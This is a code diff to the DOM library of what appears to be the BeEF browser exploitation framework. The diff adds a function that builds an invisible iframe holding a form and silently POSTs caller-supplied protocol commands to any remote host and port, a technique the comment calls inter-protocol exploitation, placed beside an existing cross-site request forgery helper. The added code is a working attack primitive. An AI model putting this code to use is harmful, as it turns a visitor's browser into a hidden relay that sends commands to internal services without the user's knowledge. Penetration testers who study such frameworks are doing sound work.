@@ -340,6 +340,30 @@ beef.dom = {
         formXsrf.submit();
 
         return iframeXsrf;
+    },
+
+    /**
+     * Create an invisible iFrame with a form inside, and POST the form in plain-text. Used for inter-protocol exploitation.
+     * @params: {String} rhost: remote host ip/domain
+     * @params: {String} rport: remote port
+     * @params: {String} commands: protocol commands to be executed by the remote host:port service
+     */
+    createIframeIpecForm: function(rhost, rport, commands){
+        var iframeIpec = beef.dom.createInvisibleIframe();
+
+        var formIpec = document.createElement('form');
+        formIpec.setAttribute('action',  'http://'+rhost+':'+rport+'/index.html');
+        formIpec.setAttribute('method',  'POST');
+        formIpec.setAttribute('enctype', 'multipart/form-data');
+
+        input = document.createElement('textarea');
+        input.setAttribute('name', Math.random().toString(36).substring(5));
+        input.value = commands;
+        formIpec.appendChild(input);
+        iframeIpec.contentWindow.document.body.appendChild(formIpec);
+        formIpec.submit();
+
+        return iframeIpec;
     }
 
 };
